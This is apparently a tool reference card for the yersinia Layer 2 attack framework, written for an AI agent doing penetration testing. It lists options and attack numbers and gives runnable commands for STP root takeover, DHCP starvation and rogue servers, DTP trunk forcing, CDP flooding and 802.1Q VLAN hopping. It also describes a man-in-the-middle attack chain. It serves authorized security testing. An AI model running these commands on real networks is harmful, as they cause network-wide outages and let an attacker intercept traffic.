# yersinia

- **Category**: VoIP-ICS / Layer 2 Attacks
- **Risk Level**: 🔴 Critical

---

## Description

Layer 2 network protocol attack framework. Supports attacks against STP (become root bridge), CDP (flooding, impersonation), DTP (trunk negotiation forcing), DHCP (starvation, rogue server), HSRP (active router hijack), 802.1Q (VLAN hopping), 802.1X (DoS), ISL, and VTP. Use `-I` for interactive CLI mode; avoid `-G` (GTK GUI — out of scope for agent use).

## Installation

```bash
sudo apt install yersinia
```

## Parameter Reference

### Top-level Options

| Parameter | Description |
|------|------|
| `-I` | Interactive CLI mode (ncurses) |
| `-G` | Graphical mode (GTK) |
| `-D` | Daemon mode (background, listens on TCP port 12000) |
| `-d` | Debug mode |
| `-l <logfile>` | Log to file |
| `-c <conffile>` | Select config file |
| `-M` | Disable MAC spoofing |
| `-V` | Display program version |
| `-h` | Show help |

### Protocol-level Options

Specified after the protocol name: `yersinia <protocol> [options]`

| Parameter | Description |
|------|------|
| `-attack <n>` | Attack number for the specified protocol |
| `-interface <iface>` | Network interface to use |
| `-source <hw_addr>` | Source MAC address |
| `-dest <hw_addr>` | Destination MAC address |

### Supported Protocols

| Parameter | Description |
|------|------|
| `stp` | Spanning Tree Protocol attacks |
| `cdp` | Cisco Discovery Protocol attacks |
| `dtp` | Dynamic Trunking Protocol attacks |
| `dhcp` | DHCP starvation and rogue server attacks |
| `hsrp` | Hot Standby Router Protocol attacks |
| `dot1q` | 802.1Q VLAN tagging attacks |
| `dot1x` | 802.1X authentication DoS |
| `isl` | Inter-Switch Link attacks |
| `mpls` | MPLS label attacks |
| `vtp` | VLAN Trunking Protocol attacks |

### Common Attack Numbers

| Parameter | Description |
|------|------|
| `stp -attack 4` | Become root bridge (NONDOS, Claiming Root Role) |
| `stp -attack 6` | Become root bridge with MiTM (DOS, Claiming Root Role with MiTM) |
| `cdp -attack 0` | Send a raw CDP packet (low-impact, info gathering) |
| `cdp -attack 1` | CDP flooding (DoS) |
| `dtp -attack 1` | Enable trunking (force DTP negotiation) |
| `dhcp -attack 1` | DHCP starvation (exhaust address pool) |
| `dhcp -attack 2` | Rogue DHCP server |
| `hsrp -attack 1` | Become active HSRP router |
| `dot1q -attack 1` | 802.1Q double-tagging VLAN hop |

## Common Commands

```bash
# STP root bridge takeover — become root bridge on the network (attack 4 = NONDOS Claiming Root Role)
sudo yersinia stp -attack 4 -interface eth0

# DHCP starvation — exhaust the DHCP address pool
sudo yersinia dhcp -attack 1 -interface eth0

# DTP trunk negotiation — force the switch port into trunk mode
sudo yersinia dtp -attack 1 -interface eth0

# CDP flooding — flood CDP neighbor table
sudo yersinia cdp -attack 1 -interface eth0

# 802.1Q VLAN hopping via double tagging
sudo yersinia dot1q -attack 1 -interface eth0
```

## Notes & Tips

1. Layer 2 attacks can cause network-wide outages — STP root bridge takeover and DHCP starvation affect all hosts on the broadcast domain. Always confirm scope and obtain explicit authorization.
2. Use `yersinia -I` for interactive mode to see real-time protocol state and choose attacks from a menu.
3. DHCP starvation (`dhcp -attack 1`) followed by rogue DHCP (`dhcp -attack 2`) is a common attack chain for man-in-the-middle positioning.
4. DTP trunk negotiation succeeds only on switch ports configured as `dynamic auto` or `dynamic desirable` — hardened ports set to `switchport mode access` are immune.
5. All attacks require root privileges and a directly connected network interface — these are not routable attacks.

---

## Official References

- [yersinia GitHub](https://github.com/tomac/yersinia)
- [Kali yersinia](https://www.kali.org/tools/yersinia/)
